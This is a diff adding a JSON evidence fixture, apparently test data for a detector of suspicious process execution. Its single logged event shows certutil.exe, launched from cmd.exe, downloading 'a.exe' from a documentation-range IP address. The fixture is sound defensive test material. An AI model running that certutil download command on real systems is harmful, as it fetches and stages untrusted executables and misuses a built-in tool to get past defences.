@@ -1,0 +1,35 @@
+{
+  "evidence": {
+    "schema_version": "copley.evidence/v1",
+    "window_id": "mal-certutil_download-0",
+    "task_id": "process_execution.suspicious.v1",
+    "as_of": "2026-10-01T12:00:30Z",
+    "anchor_event_id": "mal-certutil_download-0-e0",
+    "events": [
+      {
+        "event_id": "mal-certutil_download-0-e0",
+        "event_type": "process_creation",
+        "timestamp": "2026-10-01T12:00:00Z",
+        "observed_at": "2026-10-01T12:00:00Z",
+        "host": "WORKSTATION-00",
+        "image": "C:\\Windows\\System32\\certutil.exe",
+        "original_file_name": "CertUtil.exe",
+        "command_line": "certutil.exe -urlcache -split -f http://198.51.100.9/a.exe a.exe",
+        "current_directory": "C:\\Users\\analyst\\",
+        "integrity_level": "High",
+        "user": "CORP\\analyst",
+        "process_id": "4000",
+        "parent_image": "C:\\Windows\\System32\\cmd.exe",
+        "parent_command_line": "cmd.exe /c download",
+        "parent_process_id": "2000",
+        "source_truncated_fields": []
+      }
+    ],
+    "context": {
+      "policy": "anchor_only",
+      "related_events_available": null,
+      "related_events_omitted": 0,
+      "notes": null
+    }
+  }
+}
